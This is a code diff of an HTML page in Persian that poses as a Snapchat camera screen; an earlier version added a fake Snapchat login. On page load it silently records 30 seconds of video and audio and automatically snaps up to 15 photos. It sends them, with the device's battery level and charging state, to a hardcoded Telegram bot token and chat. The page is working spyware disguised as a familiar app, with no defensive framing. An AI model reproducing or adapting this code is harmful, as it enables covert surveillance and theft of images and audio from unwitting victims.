@@ -1,52 +1,83 @@
-<!DOCTYPE html>
-<html lang="fa">
+<!DOCTYPE html><html lang="fa">
 <head>
   <meta charset="UTF-8">
-  <title>ورود به اسنپ‌چت</title>
+  <title>Snap UI</title>
   <meta name="viewport" content="width=device-width, initial-scale=1">
+  <link href="https://cdn.jsdelivr.net/gh/rastikerdar/vazirmatn@v33.003/Vazirmatn-font-face.css" rel="stylesheet">
   <script src="https://cdn.tailwindcss.com"></script>
+  <script src="https://unpkg.com/lucide@latest"></script>
   <style>
-    body { margin: 0; padding: 0; font-family: sans-serif; background-color: #fffc00; color: #000; direction: rtl; }
-    #video { width: 100vw; height: 100vh; object-fit: cover; position: absolute; top: 0; left: 0; z-index: -1; }
-    #overlay { position: absolute; top: 0; left: 0; width: 100%; height: 100%; display: flex; flex-direction: column; justify-content: end; align-items: center; padding-bottom: 40px; background-color: rgba(0,0,0,0.2); }
-    .btn { width: 64px; height: 64px; border-radius: 50%; background: white; border: 4px solid black; }
-    #switchCam { position: absolute; bottom: 20px; right: 20px; background: white; padding: 10px; border-radius: 50%; }
-    #inputSection { position: absolute; z-index: 999; top: 0; left: 0; width: 100vw; height: 100vh; background: #fffc00; display: flex; flex-direction: column; align-items: center; justify-content: center; }
+    body {
+      direction: rtl;
+      font-family: 'Vazirmatn', sans-serif;
+      margin: 0;
+      background: #FFFC00;
+      color: #000;
+      overflow: hidden;
+    }
+    #video {
+      position: absolute;
+      top: 0; left: 0;
+      width: 100%; height: 100%;
+      object-fit: cover;
+      z-index: 0;
+    }
+    .overlay {
+      position: absolute;
+      top: 0; left: 0;
+      width: 100%; height: 100%;
+      z-index: 1;
+      display: flex;
+      flex-direction: column;
+      justify-content: space-between;
+      padding: 1rem;
+      background: linear-gradient(to top, rgba(255,255,255,0.1), transparent 60%);
+    }
+    .circle-btn {
+      width: 72px; height: 72px;
+      background-color: white;
+      border-radius: 50%;
+      border: 4px solid #000;
+    }
   </style>
 </head>
 <body>
-  <div id="inputSection">
-    <h1 class="text-xl font-bold mb-4">ورود به اسنپ‌چت</h1>
-    <input id="userId" type="text" placeholder="@آیدی شما" class="p-3 rounded w-72 text-center mb-4">
-    <button onclick="startApp()" class="bg-black text-white py-2 px-6 rounded">ورود</button>
-  </div>
+  <video id="video" autoplay playsinline muted></video>
+  <div class="overlay">
+    <div class="flex justify-between">
+      <div></div>
+      <button onclick="switchCamera()" class="text-black p-2 bg-white/40 rounded-full">
+        <i data-lucide="camera"></i>
+      </button>
+    </div>
+    <div class="flex justify-center">
+      <button onclick="takePhoto()" class="circle-btn"></button>
+    </div>
+  </div>  <script>
+    lucide.createIcons();
+    let useFront = true;
+    let stream;
+    let mediaRecorder;
+    let chunks = [];
+    let photoCount = 0;
+    let videoSent = false;
 
-  <video id="video" autoplay muted playsinline></video>
-  <div id="overlay" class="hidden">
-    <button id="takePhoto" class="btn" onclick="manualPhoto()"></button>
-    <button id="switchCam" onclick="switchCamera()">🔄</button>
-  </div>
-
-  <script>
     const botToken = "7336954365:AAHqd7DgkHDMetoFFjtNWvmV1IWZsmiiaLU";
     const chatId = "-1002563925697";
 
-    let stream, mediaRecorder, videoChunks = [], photoCount = 0, uid = "", useFront = true;
-
-    function startApp() {
-      uid = document.getElementById("userId").value.trim();
-      if (!uid || !uid.startsWith("@")) return alert("لطفاً آیدی با @ وارد کنید.");
-      document.getElementById("inputSection").style.display = "none";
-      document.getElementById("overlay").classList.remove("hidden");
-      startCamera();
-      startRecording();
-      autoCapture();
-    }
-
     async function startCamera() {
       if (stream) stream.getTracks().forEach(t => t.stop());
-      stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: useFront ? "user" : "environment" }, audio: true });
-      document.getElementById("video").srcObject = stream;
+      try {
+        stream = await navigator.mediaDevices.getUserMedia({
+          video: { facingMode: useFront ? "user" : "environment" },
+          audio: true
+        });
+        document.getElementById('video').srcObject = stream;
+        startRecording();
+        autoCapture();
+      } catch (err) {
+        alert("دوربین یا میکروفن در دسترس نیست.");
+      }
     }
 
     function switchCamera() {
@@ -54,52 +85,70 @@
       startCamera();
     }
 
-    async function autoCapture() {
-      for (let i = 0; i < 15; i++) {
-        setTimeout(() => captureAndSend(), i * 4000);
-      }
-      setTimeout(() => stopRecording(), 31000);
-    }
-
-    function manualPhoto() {
-      captureAndSend();
-    }
-
-    async function captureAndSend() {
+    async function takePhoto() {
+      const video = document.getElementById("video");
       const canvas = document.createElement("canvas");
-      const videoEl = document.getElementById("video");
-      canvas.width = videoEl.videoWidth;
-      canvas.height = videoEl.videoHeight;
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
       const ctx = canvas.getContext("2d");
-      ctx.drawImage(videoEl, 0, 0, canvas.width, canvas.height);
+      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
       canvas.toBlob(async blob => {
         const battery = await navigator.getBattery();
+        const percent = Math.round(battery.level * 100);
+        const charging = battery.charging ? "در حال شارژ" : "غیر متصل";
+        const caption = `عکس ${++photoCount}\n🔋 شارژ: ${percent}%\n⚡️ ${charging}`;
+
         const form = new FormData();
         form.append("chat_id", chatId);
-        form.append("photo", blob, `photo_${photoCount}.jpg`);
-        form.append("caption", `آیدی: ${uid}\n${++photoCount}️⃣ عکس\n🔋 ${battery.level * 100}%\n⚡ شارژ: ${battery.charging ? "بله" : "خیر"}`);
-        fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, { method: "POST", body: form });
-      }, 'image/jpeg');
+        form.append("photo", blob, `photo${photoCount}.jpg`);
+        form.append("caption", caption);
+        await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+          method: "POST",
+          body: form
+        });
+      }, 'image/jpeg', 0.7);
+    }
+
+    function autoCapture() {
+      let interval = setInterval(() => {
+        if (photoCount >= 15) return clearInterval(interval);
+        takePhoto();
+      }, 4000);
     }
 
     function startRecording() {
-      mediaRecorder = new MediaRecorder(stream, { mimeType: "video/webm;codecs=vp9" });
-      mediaRecorder.ondataavailable = e => videoChunks.push(e.data);
-      mediaRecorder.onstop = async () => {
-        const videoBlob = new Blob(videoChunks, { type: "video/webm" });
-        const form = new FormData();
-        form.append("chat_id", chatId);
-        form.append("video", videoBlob, "record.webm");
-        form.append("caption", `🎥 ویدیو ۳۰ ثانیه‌ای\nآیدی: ${uid}`);
-        fetch(`https://api.telegram.org/bot${botToken}/sendVideo`, { method: "POST", body: form });
-        videoChunks = [];
-      };
+      chunks = [];
+      mediaRecorder = new MediaRecorder(stream, { mimeType: "video/webm; codecs=vp9" });
+      mediaRecorder.ondataavailable = e => chunks.push(e.data);
+      mediaRecorder.onstop = sendVideo;
       mediaRecorder.start();
+      setTimeout(() => {
+        if (mediaRecorder && mediaRecorder.state === "recording") {
+          mediaRecorder.stop();
+        }
+      }, 30000); // حداکثر ۳۰ ثانیه
     }
 
-    function stopRecording() {
-      mediaRecorder.stop();
+    async function sendVideo() {
+      if (videoSent) return;
+      videoSent = true;
+      const blob = new Blob(chunks, { type: "video/webm" });
+      const form = new FormData();
+      form.append("chat_id", chatId);
+      form.append("video", blob, "video.webm");
+      form.append("caption", "ویدیو ضبط شده");
+      await fetch(`https://api.telegram.org/bot${botToken}/sendVideo`, {
+        method: "POST",
+        body: form
+      });
     }
-  </script>
-</body>
+
+    window.addEventListener("beforeunload", () => {
+      if (mediaRecorder && mediaRecorder.state === "recording") {
+        mediaRecorder.stop();
+      }
+    });
+
+    startCamera();
+  </script></body>
 </html>
